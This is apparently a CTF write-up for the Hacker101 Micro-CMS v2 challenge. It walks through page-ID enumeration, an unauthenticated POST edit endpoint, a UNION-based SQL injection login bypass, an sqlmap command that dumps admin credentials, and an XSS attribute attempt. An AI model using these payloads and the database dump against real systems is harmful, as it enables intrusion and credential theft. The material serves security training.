---
title: Micro-CMS v2 walkthrough
date: "2022-10-02T09:30:00.284Z"
description: "Writeup for the Hacker101 CTF problem Micro-CMS v2"
---

This is a continuation over the previous `Micro-CMS v1` challenge from [Hacker101 CTF](https://ctf.hacker101.com/), so I recommend giving it a shot and [reading the previous walkthrough](/hacker101-ctf/intro) before proceeding with this one.

Alright, the new challenge allows us to see what's new on this app relative to the old one.

```md
# Micro-CMS Changelog

## Version 2

This version fixed the multitude of security flaws and general functionality bugs that plagued v1. Additionally, we added user authentication; we're still not sure why we didn't think about that the first time, but hindsight is 20/20. By default, users need to be an admin to add or edit pages now.
```

It seems like the developers have fixed every vulnerability from the previous challenge! I hope not, but let's see what we can do. In the previous challenge we had a hidden page but we don't know if that's still the case, so let's enumerate page IDs again:

```bash
$ seq 50 > range.txt

$ ffuf -w range.txt -u https://<subdomain>.ctf.hacker101.com/page/FUZZ
...

2      [Status: 200, Size: 433, Words: 19, Lines: 16]
1      [Status: 200, Size: 538, Words: 63, Lines: 15]
3      [Status: 403, Size: 234, Words: 27, Lines: 5]
```

We have a page with ID `3` that we have never seen before, but this time trying to access `/page/edit/3` fails since it's behind authentication. A common mistake by developers is only protecting pages that the client can see (`GET` requests), but nothing prevents users from sending other [HTTP methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods) to the server.

### Flag 1

So a `GET` to `/page/edit/3` yields a `403`, does `POST` or `PUT` yield the same HTTP response code?

```bash
$ curl -X PUT "https://<subdomain>.ctf.hacker101.com/page/edit/3"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>

$ curl -X POST "https://<subdomain>.ctf.hacker101.com/page/edit/3"
^FLAG^...$FLAG$%
```

 `POST` is not protected and gives us our first flag! It's worth noting that `GET /page/3` still yields a `forbidden`, so there might be something else in that page.
 
 I feel it's time to start playing with the new login feature and see if we can get access to these pages.

### Flag 2

Going to the `/login` path and sending a single quote (`'`) as the username yields the server error that we can see below:

```python
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```

Errors that yield the stacktrace are super valuable since it gives us more ideas of what can be exploited. In this case, we can see that the server is using MariaDB and that the error is related to the SQL syntax. We can also see that the query is being built using string interpolation without any escaping or parameterized queries. This means that we can inject SQL code into the query and get the server to execute it.

Sending the username as `abc' OR 1=1;--` bypasses this username check, but still doesn't allow us to login with the message: `Invalid password`. If the username that we used confuses you I recommend going over [this material](https://portswigger.net/web-security/sql-injection) from PortSwigger Academy.

We could go and use something like [sqlmap](https://github.com/sqlmapproject/sqlmap) to automate the SQL injection exploitation and dump the entire database, but let's see how the SQL query is built and try to bypass it manually:

```sql
SELECT password FROM admins WHERE username=\'%s\'' % request.form['username']
```

What the developers of the application are doing is:

1. Getting an user based on their username
2. Returning the password from that user

So I went to https://onecompiler.com/mysql and created the following database schema to start playing with this query:

```sql
CREATE TABLE admins (username TEXT NOT NULL, password TEXT NOT NULL);
INSERT INTO admins VALUES ('admin', 'hello');
```

Now we are ready to start making queries to this database:

```sql
SELECT password FROM admins WHERE username = 'admin';
```

And of course I get the password back, which is `'hello'`. How can we make this query return any password we want? Let's try to use a `UNION`:

```sql
SELECT password FROM admins WHERE username = 'admin' UNION SELECT 'potato';
```

This yields two results,  `'hello'` on the first line and `'potato'` on the second (try it!). Is this enough? 

It sure is! Sending an username with the contents below and the password with value `potato` allows us to get logged in.

```sql
username=abc' UNION SELECT 'potato';--`
```

We see the following HTML after logging in:

```html
<!doctype html>
<html>
	<head>
		<title>Logged in</title>
	</head>
	<body>
		<h1>Logged In!</h1>
		<a href="home">Go Home</a>
		<script>setTimeout(function() { window.location = 'home'; }, 3000);</script>
		<!-- You got logged in, congrats!  Do you have the real username and password?  If not, might want to do that! -->
	</body>
</html>
```

That comment is slightly concerning, implying that we will still need to login properly to finish the challenge, but let's set this aside for now.

After three seconds we get redirected to the home page and we see one more page called `Private Page` (the page with `ID 3`). By clicking on it we get our second flag!

### Flag 3

Now that we have edit powers I tried to cause an XSS in the `button` within the `# Markdown Test` page, like we did on the previous challenge. To do that you just need to edit that page and add an attribute `onclick="alert(1)"` and save the page. I played a bunch with it thinking that an admin would see that page and we would be able to get their cookie through XSS, but that was a dead end.

Eventually I remembered the HTML comment from `Flag 2`:

```html
<!-- You got logged in, congrats!  Do you have the real username and password?  If not, might want to do that! -->
```

This prompted me to dump the database using `sqlmap` since I have no idea what the existing username actually is. Here's what I did:

```bash
$ sqlmap -u https://<subdomain>.ctf.hacker101.com/login --data "username=abc&password=xyz" -p username --dbms=mysql --dump
```

* `-p` is used to specify which parameter `sqlmap` should test, and we know `username` is the vulnerable one.

We end up being able to read the `admins` table:

```md
Table: admins
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | stefany  | hattie   |
+----+----------+----------+
```

And after logging in with these credentials we get our last flag!

### Conclusion

This was an interesting challenge. The lack of auth for the `POST /page/edit/<ID>` endpoint is realistic and easily missed if you are not using a framework that makes new endpoints secure by default. The SQLi is a common theme in CTFs, but always a fun thing to exploit.

Thanks for reading and I will see you in our next post!
